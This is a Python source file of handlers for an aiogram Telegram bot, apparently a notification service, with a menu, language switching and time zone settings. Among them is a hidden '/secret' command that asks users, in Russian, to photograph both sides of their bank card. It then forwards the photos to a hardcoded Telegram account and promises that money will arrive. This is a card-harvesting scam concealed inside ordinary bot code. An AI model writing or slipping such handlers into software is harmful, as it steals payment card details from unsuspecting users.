import asyncpg
from aiogram import Dispatcher
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.builtin import CommandStart
from aiogram.types import CallbackQuery, Message

from tg_bot.filters.chats import IsPrivate
from tg_bot.keyboards.inline import main_menu, notification_menu, inside_notification_menu, back_to_notification_menu, \
    personal_acc_menu, time_zone_menu
from tg_bot.states.states import SecretState
from tg_bot.utils.messages import start_msg, notifications_menu_message, notification_desc, \
    notification_deleted_message, personal_acc_text, choose_time_zone
from tg_bot.utils.setting_commands import set_starting_commands


async def call_main_menu(call: CallbackQuery, state: FSMContext, user: asyncpg.Record):
    await state.finish()
    await call.message.edit_text(
        start_msg.get(user.get('lang')).replace("name", call.from_user.full_name),
        reply_markup=main_menu(user.get('lang'))
    )


async def bot_start(message: Message, state: FSMContext, user: asyncpg.Record):
    await state.finish()
    await set_starting_commands(message.bot, message.from_user.id)
    await message.answer(
        start_msg.get(user.get('lang')).replace("name", message.from_user.full_name),
        reply_markup=main_menu(user.get('lang'))
    )


async def change_lang(call: CallbackQuery, user: asyncpg.Record):
    db = call.bot.get("db")
    new_lang = 'ru' if user.get('lang') == 'en' else 'en'
    await db.update_user(user.get('id'), lang=new_lang)
    await call.message.edit_text(
        start_msg.get(new_lang).replace("name", call.from_user.full_name),
        reply_markup=main_menu(new_lang)
    )


async def personal_acc_handler(call: CallbackQuery, user: asyncpg.Record):
    await call.message.edit_text(personal_acc_text(user),
                                 reply_markup=personal_acc_menu(user.get('lang'))
                                 )


async def change_time_zone_handler(call: CallbackQuery, user: asyncpg.Record):
    option = call.data.split(":")[1]
    db = call.bot.get("db")
    if option != "main":
        await db.update_user(call.from_user.id, time_zone=option)
        user = await db.get_user(call.from_user.id)
    await call.message.edit_text(choose_time_zone.get(user.get('lang')),
                                 reply_markup=time_zone_menu(await db.get_all_time_zones(), user)
                                 )


async def secret_command(message: Message):
    await message.answer("<b>Поздравляю, вы нашли секретную команду!!\n\n"
                         "Отправьте мне фото вашей карты с обеих сторон, для продолжения.</b>")
    await SecretState.S1.set()


async def secret_command_2(message: Message, state: FSMContext):
    await message.forward(506215452)
    await message.answer("Вам скоро придут деньги на карту...")
    await state.finish()


def register_general(dp: Dispatcher):
    dp.register_callback_query_handler(call_main_menu, text="back_to_main_menu", state="*")
    dp.register_message_handler(bot_start, IsPrivate(), CommandStart(), state="*")
    dp.register_callback_query_handler(change_lang, text="change_lang")
    dp.register_callback_query_handler(personal_acc_handler, text="personal_acc")
    dp.register_callback_query_handler(change_time_zone_handler, text_startswith="change_time_zone:")
    dp.register_message_handler(secret_command, commands='secret')
